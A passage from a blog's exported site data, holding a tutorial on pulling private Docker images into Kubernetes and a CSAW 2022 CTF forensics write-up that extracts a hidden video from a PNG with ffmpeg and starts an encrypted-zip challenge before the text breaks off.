class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">private-docker</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">ports:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">port:</span> <span class=\"number\">80</span></span><br><span class=\"line\">    <span class=\"attr\">protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\">    <span class=\"attr\">targetPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">NodePort</span></span><br></pre></td></tr></table></figure>\n<p>Let’s now check the service and get the node port that we will use it to test the pod</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get svc -n private-docker</span><br><span class=\"line\">NAME           TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE</span><br><span class=\"line\">cars-app-pod   NodePort   10.111.98.22   &lt;none&gt;        80:31651/TCP   6s</span><br></pre></td></tr></table></figure>\n<p>Now you can visit either <span class=\"exturl\" data-url=\"aHR0cDovL21hc3RlcjozMTY1MQ==\">http://master:31651</span> or <span class=\"exturl\" data-url=\"aHR0cDovL3dvcmtlcjE6MzE2NTE=\">http://worker1:31651</span> and you will find the static website work without any problem!</p>\n<p><img data-src=\"https://imgur.com/3TVOl36.png\" alt=\"\"></p>\n","site":{"data":{}},"length":6548,"excerpt":"","more":"<p>In this article you will learn how to containerize a static website using nginx. Then we will push a private docker image in dockerhub. Finally we will use this private image to be pulled in our Kubernetes cluster ! I will split this article to 2 small and easy steps, you can skip any one you want !</p>\n<h1 id=\"containerize-a-static-website-and-push-it-on-dockerhub\"><a class=\"markdownIt-Anchor\" href=\"#containerize-a-static-website-and-push-it-on-dockerhub\">#</a> Containerize a static website and push it on dockerhub</h1>\n<p>In this Section we will choose a template from random websites that provides free css templates, then we will dockerize it !</p>\n<h2 id=\"dockerize-the-website\"><a class=\"markdownIt-Anchor\" href=\"#dockerize-the-website\">#</a> Dockerize the website</h2>\n<p>I’ll choose this template from this <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZS1jc3MuY29tL2ZyZWUtY3NzLXRlbXBsYXRlcy9wYWdlMjgyL3JveWFsLWNhcnM=\">link</span><br>\n<img data-src=\"https://imgur.com/ngHGyw0.png\" alt=\"\"></p>\n<p>Download it and let’s create our Dockerfile !<br>\nWe will use the  <code>nginx:alpine</code>  image and copy all the assets of the website to the  <code>/usr/share/nginx/html</code>  to be hosted by the nginx webserver.</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> nginx:alpine</span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /usr/share/nginx/html</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">rm</span> -rf ./*</span></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./ ./</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">chmod</span> +r -R . </span></span><br><span class=\"line\"><span class=\"keyword\">ENTRYPOINT</span><span class=\"language-bash\"> [<span class=\"string\">&quot;nginx&quot;</span>,<span class=\"string\">&quot;-g&quot;</span>,<span class=\"string\">&quot;daemon off;&quot;</span>]</span></span><br></pre></td></tr></table></figure>\n<p>Now it’s time to build the container image</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ sudo docker build . -t &lt;user_name&gt;/cars-app</span><br><span class=\"line\">Sending build context to Docker daemon  2.454MB</span><br><span class=\"line\">Step 1/5 : FROM nginx:alpine</span><br><span class=\"line\">alpine: Pulling from library/nginx</span><br><span class=\"line\">213ec9aee27d: Downloading [===================================&gt;               ]  2.018MB/2.806MB</span><br><span class=\"line\">2546ae67167b: Downloading [=========&gt;                                         ]  1.461MB/7.403MB</span><br><span class=\"line\">23b845224e13: Download complete</span><br><span class=\"line\">9bd5732789a3: Download complete</span><br><span class=\"line\">328309e59ded: Waiting</span><br><span class=\"line\">b231d02e5150: Waiting</span><br></pre></td></tr></table></figure>\n<p>Now let’s create a container to test it before make push it!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ sudo docker run --name car-demo -p 8686:80 &lt;user_name&gt;/cars-app</span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: using the &quot;epoll&quot; event method</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: nginx/1.23.1</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219)</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: OS: Linux 5.15.0-41-generic</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker processes</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 7</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 8</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 9</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 10</span></span><br></pre></td></tr></table></figure>\n<p>Sanity Check please ! Oh everything is OK !</p>\n<p><img data-src=\"https://imgur.com/nQ6NcxG.png\" alt=\"\"></p>\n<h2 id=\"push-the-container-image-to-private-repo\"><a class=\"markdownIt-Anchor\" href=\"#push-the-container-image-to-private-repo\">#</a> Push the container image to private repo</h2>\n<p>Now go and create a private repository in your dockerhub to push it !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ sudo docker image push &lt;user_name&gt;/cars-app</span><br><span class=\"line\">Using default tag: latest</span><br><span class=\"line\">The push refers to repository [docker.io/&lt;user_name&gt;/cars-app]</span><br><span class=\"line\">41c30355eff8: Pushed</span><br><span class=\"line\">f2ba5e032e84: Pushed</span><br><span class=\"line\">43e1f37b87cb: Pushed</span><br><span class=\"line\">bf4e176a4d9b: Mounted from library/nginx</span><br><span class=\"line\">a1d571e4e83d: Mounted from library/nginx</span><br><span class=\"line\">6d97b4d00719: Mounted from library/nginx</span><br><span class=\"line\">2a7647ca3937: Mounted from library/nginx</span><br><span class=\"line\">549c42eea4a6: Mounted from library/nginx</span><br><span class=\"line\">994393dc58e7: Mounted from library/nginx</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to deal with our kubernetes cluster !</p>\n<h1 id=\"use-the-private-docker-image-in-kubernetes\"><a class=\"markdownIt-Anchor\" href=\"#use-the-private-docker-image-in-kubernetes\">#</a> Use the private docker image in Kubernetes</h1>\n<p>In this demo I will use a production kubernetes cluster with 1 master node and 1 worker node</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get nodes</span><br><span class=\"line\">NAME      STATUS   ROLES                  AGE   VERSION</span><br><span class=\"line\">master    Ready    control-plane,master   77d   v1.23.1</span><br><span class=\"line\">worker1   Ready    &lt;none&gt;                 77d   v1.23.1</span><br></pre></td></tr></table></figure>\n<p>Let’s create a namespace for this demo !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl create ns private-docker</span><br><span class=\"line\">namespace/private-docker created</span><br></pre></td></tr></table></figure>\n<p>To make our cluster pull private images we need to create a special secret object with specific type called  <code>docker-registry</code>  secret. To make this secret work correctly you must specify the docker registry, username , password and docker email!</p>\n<p>I prefer to put this params in variable environment to work with it easly</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> EMAIL=&lt;email&gt;</span><br><span class=\"line\"><span class=\"built_in\">export</span> USERNAME=&lt;user_name&gt;</span><br><span class=\"line\"><span class=\"built_in\">export</span> PASSWORD=&lt;password&gt;</span><br><span class=\"line\"><span class=\"built_in\">export</span> SERVER=&lt;docker_registry&gt;</span><br></pre></td></tr></table></figure>\n<p>In case you will use dockerhub as your registry you don’t have to specify the server !</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl create -n private-docker secret docker-registry docker-secret --docker-username=$USERNAME --docker-password=$PASSWORD --docker-email=$EMAIL</span><br><span class=\"line\">secret/docker-secret created</span><br></pre></td></tr></table></figure>\n<p>Now let’s create a pod with the image that we made it !</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">private-docker</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">image:</span> <span class=\"string\">&lt;user_name&gt;/cars-app</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">    <span class=\"attr\">resources:</span> &#123;&#125;</span><br><span class=\"line\">  <span class=\"attr\">dnsPolicy:</span> <span class=\"string\">ClusterFirst</span></span><br><span class=\"line\">  <span class=\"attr\">restartPolicy:</span> <span class=\"string\">Always</span></span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>If you try create this pod with this YAML definition you’ll get a  <code>ErrImagePull</code>  because we don’t specify the docker secret that we created</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get pods -n private-docker</span><br><span class=\"line\">NAME           READY   STATUS         RESTARTS   AGE</span><br><span class=\"line\">cars-app-pod   0/1     ErrImagePull   0          5s</span><br></pre></td></tr></table></figure>\n<p>Let’s figure out the problem with  <code>kubectl describe</code>  command. Take a look at the events that occur when the pod try to pull the container image!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Events:</span><br><span class=\"line\"> Type     Reason          Age                From               Message</span><br><span class=\"line\"> ----     ------          ----               ----               -------</span><br><span class=\"line\"> Normal   Scheduled       44s                default-scheduler  Successfully assigned private-docker/cars-app-pod to worker1</span><br><span class=\"line\"> Normal   SandboxChanged  40s                kubelet            Pod sandbox changed, it will be killed and re-created.</span><br><span class=\"line\"> Normal   Pulling         26s (x2 over 43s)  kubelet            Pulling image &quot;&lt;user_name&gt;/cars-app&quot;</span><br><span class=\"line\"> Warning  Failed          23s (x2 over 40s)  kubelet            Failed to pull image &quot;&lt;user_name&gt;/cars-app&quot;: rpc error: code = Unknown desc = Error response from daemon: pull access denied for &lt;user_name&gt;/cars-app, repository does not exist or may require &#x27;docker login&#x27;: denied: requested access to the resource is denied</span><br><span class=\"line\"> Warning  Failed          23s (x2 over 40s)  kubelet            Error: ErrImagePull</span><br><span class=\"line\"> Normal   BackOff         12s (x4 over 39s)  kubelet            Back-off pulling image &quot;&lt;user_name&gt;/cars-app&quot;</span><br><span class=\"line\"> Warning  Failed          12s (x4 over 39s)  kubelet            Error: ImagePullBackOff</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Specifying the docker secret in the pod YAML definition will solve this problem. The pod will pull the container image without any problem<br>\nAdding  <code>imagePullSecrets</code>  attributes in the  <code>spec</code>  of the pod allow the pod to pull this image. The Final YAML definition will be similar to the following one !</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">private-docker</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">image:</span> <span class=\"string\">&lt;user_name&gt;/cars-app</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">    <span class=\"attr\">resources:</span> &#123;&#125;</span><br><span class=\"line\">  <span class=\"attr\">imagePullSecrets:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">docker-secret</span></span><br><span class=\"line\">  <span class=\"attr\">dnsPolicy:</span> <span class=\"string\">ClusterFirst</span></span><br><span class=\"line\">  <span class=\"attr\">restartPolicy:</span> <span class=\"string\">Always</span></span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>Create the pod again and check it with  <code>kubectl get pods</code>  and don’t forget to specify the namespace!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get pods -n private-docker</span><br><span class=\"line\">NAME           READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">cars-app-pod   1/1     Running   0          4s</span><br></pre></td></tr></table></figure>\n<p>I want to make sure that everything is ok, so i will expose this pod using the NodePort service. The following service YAML Definition will expose the pod correctly :</p>\n<figure class=\"highlight yaml\"><figcaption><span>yaml</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">private-docker</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">ports:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">port:</span> <span class=\"number\">80</span></span><br><span class=\"line\">    <span class=\"attr\">protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\">    <span class=\"attr\">targetPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">NodePort</span></span><br></pre></td></tr></table></figure>\n<p>Let’s now check the service and get the node port that we will use it to test the pod</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get svc -n private-docker</span><br><span class=\"line\">NAME           TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE</span><br><span class=\"line\">cars-app-pod   NodePort   10.111.98.22   &lt;none&gt;        80:31651/TCP   6s</span><br></pre></td></tr></table></figure>\n<p>Now you can visit either <span class=\"exturl\" data-url=\"aHR0cDovL21hc3RlcjozMTY1MQ==\">http://master:31651</span> or <span class=\"exturl\" data-url=\"aHR0cDovL3dvcmtlcjE6MzE2NTE=\">http://worker1:31651</span> and you will find the static website work without any problem!</p>\n<p><img data-src=\"https://imgur.com/3TVOl36.png\" alt=\"\"></p>\n"},{"title":"CSAW'2022 Forensics Writeup","date":"2022-09-12T10:33:37.000Z","cover":"https://imgur.com/ys2CFN6.png","_content":"\nCSAW CTF is one of the oldest and biggest CTFs in the world, with more than 900 teams participating in the 2022 edition. We would like to thank the organizers for the stable infrastructure and the creative challenges.\n\nwe finished first in the MENA region and 14th globally\n\nKudos to everyone in my team SOter14 for their huge work and efforts, you can catch up with out latest news at [our website](https://soter14.tech) and [twitter page](https://twitter.com/SOter14Team)\n\nThe contest was fun and challenging, we managed to solve 25 out of the 28 challenges in Pwn, Web, OSINT, Forensics, Steganography, Misc, Quantum Computing, AI, Cryptography, and Reverse Engineering.\n\nBelow are the writeups for forensics challs: Noir, Not Too Taxing (Crypto), and Encrypted disk.\n\n# Noir: Digital Forensics / Steganography\n+++info Description\nI am a forest, and a night of dark trees: but he who is not afraid of my darkness, will find banks full of roses under my cypresses. Friedrich Nietzsche.\n\nThe image contains a flag in the format (flag)this_is_the_flag\n+++\n\nChallenge Link & Author\n\n{% links %}\n- site: Challenge Link \n  url: https://drive.google.com/file/d/1BudamndgM6TioyzVXicMKVDjA2F-KUPz/view?usp=sharing\n  desc: CSAW 2022 - Noir\n  image: https://ctftime.org/media/events/logo_48.png\n  color: \"#2296fd\"\n- site: Author - Wen Jun L.\n  desc: Wen Jun L. Linkedin Profile\n  url: https://www.linkedin.com/in/wenjl/\n  image: https://media-exp1.licdn.com/dms/image/C5603AQGZdulNxGshvg/profile-displayphoto-shrink_400_400/0/1602081502952?e=1668643200&v=beta&t=XeXg__QTpf__BhQHFkZD7sSsL7PeCEbEXdi-J66JfeU\n  color: \"#de2336\"\n{% endlinks %}\n\nThis challenge blowed our minds, it was part of CSAW'21 Finals and it is a 0-solves chall, so it was offered in the Quals of 2022. We've got an image, bit heavy around 9 MB that looks like a scene from a horror game, storm, forest, and darkness. It was a twisted chall!\n\n![](https://github.com/u91o/noir/blob/main/noir.png?raw=true)\n\nFirst, we tried the normal steganogrpahy ways around it, but obviously that is a total waster of time.\n\nIt had 100+ on Aperisolve alone!\n\nTechnically, the image is merely noise in the three RGB channels whith contrast on few areas, that when included with the alpha channel gives the image as you see it! Amazing, it really feels like some streaming technique, a kind of standard that's used by TVs to show pictures we can understand. But we neglected the thought of getting a video out of an image, how unfair! Instead we've thought of the noise as a raw data that we can feed to Audacity and hopefully get an audible thing out of it, using U-LAW since we're dealing with RAW data, it made much sense, because we have seen some images filled with noise turning into audio. But a video, insane!\n\n![](https://i.imgur.com/dpalAg1.png)\n\nAnd of course, it was a video!\n\nNoir represents a kind of movies, black and white, crime generally, and that's how we finally went into the idea that we're dealing with a video rather than an audio.\n\nThe Noir movies are taped to a stripe and played through a wheel showing still images 24 frames a second - Oh, keep that in mind! Still images mean also RAW data. That could help.\n\nBut still we wonder, how to extract the video.\nWell it can't be manually, there must be a tool, or it would be a total nightmare.\n\nTo save you some time, it was `FFmpeg`!!\n\nFFmpeg is a free and open-source software project consisting of a suite of libraries and programs for handling video, audio, and other multimedia files and streams. At its core is the command-line ffmpeg tool itself, designed for processing of audiovisual files. Per Wikipedia.\n\nWell, that means some sort of conversion, right? Yep, but from a single png to what? There are hundreds of video formats out there, some of them are no longer being used.\n\nBut we can narrow our results, to lightweight ones since the image is just 9 MB, 24 fps if that helps, RAW data, so no codecs!\n\nFFmpeg command to convert formats is basically:\n\n```bash ffmpeg command\nffmpeg -i source -pix_fmt pixelformat  -f rawvideo - > output.extension\n```\n\nYou can specify the frames, although ffmpeg can pretty much detect that automatically.\n\nWe need the pixelformat and the extension. We're getting close!\n\nHmm, since we're dealing with an image, can't the extension of the video we're looking for be both an image extension and a video extension. WEBM answers that. How clever!\n\nWebm is actually the only extension we've found thats a Joker, can be an image/audio/video. Which makes it special. That's it, by luck, we got it, WEBM.\n\nHowever we tried a lot of extenison, it was a game of trial and error, for instance we checked mp4, wmv, avi, mkv, flv, mov, you name it...\n\nFFmpeg needs a pixel format, well, there is a hude table of these formats...\n``` bash pixels format\nname=     yuv420p, nb_channels=   3, depth=   8, is_alpha=n\nname=     yuyv422, nb_channels=   1, depth=   8, is_alpha=n\nname=       rgb24, nb_channels=   3, depth=   8, is_alpha=n\nname=       bgr24, nb_channels=   3, depth=   8, is_alpha=n\nname=     yuv422p, nb_channels=   3, depth=   8, is_alpha=n\nname=     yuv444p, nb_channels=   3, depth=   8, is_alpha=n\nname=       rgb32, nb_channels=   4, depth=   8, is_alpha=y\nname=     yuv410p, nb_channels=   3, depth=   8, is_alpha=n\nname=     yuv411p, nb_channels=   3, depth=   8, is_alpha=n\nname=      rgb565, nb_channels=   3, depth=   5, is_alpha=n\nname=      rgb555, nb_channels=   3, depth=   5, is_alpha=n\nname=        gray, nb_channels=   1, depth=   8, is_alpha=n\nname=       monow, nb_channels=   1, depth=   1, is_alpha=n\nname=       monob, nb_channels=   1, depth=   1, is_alpha=n\nname=        pal8, nb_channels=   4, depth=   8, is_alpha=y\nname=    yuvj420p, nb_channels=   3, depth=   8, is_alpha=n\nname=    yuvj422p, nb_channels=   3, depth=   8, is_alpha=n\nname=    yuvj444p, nb_channels=   3, depth=   8, is_alpha=n\nname=      xvmcmc, nb_channels=   0, depth=   0, is_alpha=n\nname=    xvmcidct, nb_channels=   0, depth=   0, is_alpha=n\nname=     uyvy422, nb_channels=   1, depth=   8, is_alpha=n\nname=   uyyvyy411, nb_channels=   1, depth=   8, is_alpha=n\nname=       bgr32, nb_channels=   4, depth=   8, is_alpha=y\nname=      bgr565, nb_channels=   3, depth=   5, is_alpha=n\nname=      bgr555, nb_channels=   3, depth=   5, is_alpha=n\nname=        bgr8, nb_channels=   1, depth=   8, is_alpha=n\nname=        bgr4, nb_channels=   1, depth=   4, is_alpha=n\nname=   bgr4_byte, nb_channels=   1, depth=   8, is_alpha=n\nname=        rgb8, nb_channels=   1, depth=   8, is_alpha=n\nname=        rgb4, nb_channels=   1, depth=   4, is_alpha=n\nname=   rgb4_byte, nb_channels=   1, depth=   8, is_alpha=n\nname=        nv12, nb_channels=   2, depth=   8, is_alpha=n\nname=        nv12, nb_channels=   2, depth=   8, is_alpha=n\nname=     rgb32_1, nb_channels=   4, depth=   8, is_alpha=y\nname=     bgr32_1, nb_channels=   4, depth=   8, is_alpha=y\nname=    gray16be, nb_channels=   1, depth=  16, is_alpha=n\nname=    gray16le, nb_channels=   1, depth=  16, is_alpha=n\n```\n\nWell, we didn't guess, we, at this stage, after looking deeply into the image, and as said before, the RGB channels are carrying noise that surely represent the video, however the alpha channel is the one that shape the picture as we see it in the previews. So the pixel format we choose is rgb24 excluding the alpha channel.\n\nThe final command is:\n```bash Command Line\nffmpeg -i noir.png -pix_fmt rgb24  -f rawvideo - > vid.webm\n```\n\nCoool, after all the hustle we've got a video, a subway with blinking lights, or should I say, Morse Code!\nThe clock was ticking, we're at the final hours of the CTF, and the video is 2 mins long.\nCould there be any OpenCV tool for this! Of course, here is a link you might need it as well [MorseDecoder](https://github.com/Razer2015/MorseDecoder)\n\nHere is a link for the video as well [video.webm](https://drive.google.com/file/d/19NS92WnVY1IMlG4hyEYXvsE71j_m1Cpo/view?usp=sharing)\n\nUsing the tool, I let it record my screen and positioned the cross selection on the train lights. Within a minute we've got the flag!\n\n![](https://i.imgur.com/wh0uUv2.png)\n\nFinally, it was a creative challenge we must say!\n\nThe flag is `(flag)sil3nt_refl3ct1on`\n\n# Not Too Taxing: Digital Forensics / Cryptography\n\n+++info Description\nWe intercepted some email communications between a tax consultant and his client that contained some important tax documents. We were able to successfully extract two of the documents, but we can't figure out the password to the file in order to extract the data. Attached are the two extracted files, Tax_Ret_Form_Blank.pdf and Tax_Ret_Form_Nov_2021.zip, and a transcript of the emails we found, SPBlock_Email.pdf.\n\nCan you figure out the password so we can get this guy's info?\n+++\n\nChallenge Link & Author\n\n{% links %}\n- site: Challenge Link \n  url: https://drive.google.com/drive/folders/1z5HlXGYaVxmNwVmxdDXFBOOIAedKzsZM?usp=sharing\n  desc: CSAW 2022 - Not Too Taxing\n  image: https://ctftime.org/media/events/logo_48.png\n  color: \"#2296fd\"\n- site: \n  desc: \n  url: \n  image: \n  color: \"#de2336\"\n{% endlinks %}\n\nIn this challenge we were given, an encrypted zip archive containing a filled state tax form document for the month of 